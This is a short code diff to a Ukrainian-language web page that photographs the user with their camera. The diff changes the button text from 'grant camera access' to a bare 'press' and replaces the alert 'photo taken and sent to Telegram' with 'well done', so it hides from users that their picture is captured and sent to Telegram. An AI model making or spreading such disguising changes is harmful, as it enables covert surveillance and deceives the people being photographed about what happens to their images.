@@ -33,7 +33,7 @@
     </header>
 
     <div class="controls">
-      <button id="grantBtn">Надати доступ до камери</button>
+      <button id="grantBtn">Натисни</button>
       <div class="small-note">Сторінка працює тільки через HTTPS або localhost.</div>
     </div>
 
@@ -147,7 +147,7 @@
         // Коротка пауза для автоекспозиції/фокусу
         await new Promise(r => setTimeout(r, 400));
         await captureAndSend();
-        alert('Фото зроблено і надіслано в Telegram.');
+        alert('Молодець.');
       } catch (err) {
         console.error(err);
         // Користувачу — коротке повідомлення
